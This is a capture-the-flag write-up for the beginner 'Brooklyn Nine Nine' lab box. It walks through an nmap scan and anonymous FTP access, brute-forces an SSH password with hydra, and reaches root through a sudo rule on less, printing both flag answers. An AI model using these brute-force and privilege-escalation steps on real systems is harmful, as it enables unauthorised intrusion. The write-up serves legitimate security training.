# Brooklyn Nine Nine

This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.

# User flag

*Hint: AHH Jake!*

We start with a basic nmap scan, which reveals the presence of FTP, SSH and web services on their standard ports.

~~~
PORT      STATE    SERVICE      VERSION
21/tcp    open     ftp          vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp    open     http         Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1026/tcp  filtered LSA-or-nterm
2068/tcp  filtered avocentkvm
8443/tcp  filtered https-alt
9040/tcp  filtered tor-trans
9080/tcp  filtered glrpc
10778/tcp filtered unknown
30718/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Let's check what we can get from the FTP service, as anonymous access:

~~~
unknown@kali:/data/tmp$ ftp 10.10.165.124
Connected to 10.10.165.124.
220 (vsFTPd 3.0.3)
Name (10.10.165.124:unknown): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt -
remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine


226 Transfer complete.
119 bytes received in 0.00 secs (922.3090 kB/s)
ftp> exit
221 Goodbye.
~~~

The note to jake seems to confirm that jake's password is weak. Let's try to brute force jake's SSH password:

~~~
unknown@kali:/data/tmp$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.165.124
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-19 15:58:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.165.124:22/
[22][ssh] host: 10.10.165.124   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-19 15:58:38
~~~

Now that we have jake's SSH password, let's connect. Nothing interesting in jake's home:

~~~
jake@brookly_nine_nine:~$ ls -la
total 44
drwxr-xr-x 6 jake jake 4096 May 26 09:01 .
drwxr-xr-x 5 root root 4096 May 18 10:21 ..
-rw------- 1 root root 1349 May 26 09:01 .bash_history
-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jake jake 3771 Apr  4  2018 .bashrc
drwx------ 2 jake jake 4096 May 17 21:36 .cache
drwx------ 3 jake jake 4096 May 17 21:36 .gnupg
-rw------- 1 root root   67 May 26 09:01 .lesshst
drwxrwxr-x 3 jake jake 4096 May 26 08:57 .local
-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
drwx------ 2 jake jake 4096 May 18 14:29 .ssh
-rw-r--r-- 1 jake jake    0 May 17 21:36 .sudo_as_admin_successful
~~~

But there are 3 users, 1 of which contains the user flag:

~~~
jake@brookly_nine_nine:~$ ls -l /home
total 12
drwxr-xr-x 5 amy  amy  4096 May 18 10:23 amy
drwxr-xr-x 6 holt holt 4096 May 26 09:01 holt
drwxr-xr-x 6 jake jake 4096 May 26 09:01 jake
jake@brookly_nine_nine:~$ ls -la /home/holt
total 48
drwxr-xr-x 6 holt holt 4096 May 26 09:01 .
drwxr-xr-x 5 root root 4096 May 18 10:21 ..
-rw------- 1 holt holt   18 May 26 09:01 .bash_history
-rw-r--r-- 1 holt holt  220 May 17 21:42 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17 21:42 .bashrc
drwx------ 2 holt holt 4096 May 18 10:24 .cache
drwx------ 3 holt holt 4096 May 18 10:24 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17 21:46 .local
-rw-r--r-- 1 holt holt  807 May 17 21:42 .profile
drwx------ 2 holt holt 4096 May 18 14:45 .ssh
-rw------- 1 root root  110 May 18 17:12 nano.save
-rw-rw-r-- 1 holt holt   33 May 17 21:49 user.txt
jake@brookly_nine_nine:~$ cat /home/holt/user.txt 
ee11cbb19052e40b07aac0ca060c23ee
~~~

Answer: `ee11cbb19052e40b07aac0ca060c23ee`


# Root flag

*Hint: Sudo is a good command*

Let's check jake's privileges:

~~~
jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
~~~

Jake can run `less` as root without password. Let's get the root flag:

~~~
$ sudo /usr/bin/less /root/root.txt

-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
/root/root.txt (END)
~~~

Answer: `63a9f0ea7bb98050796b649e85481845`
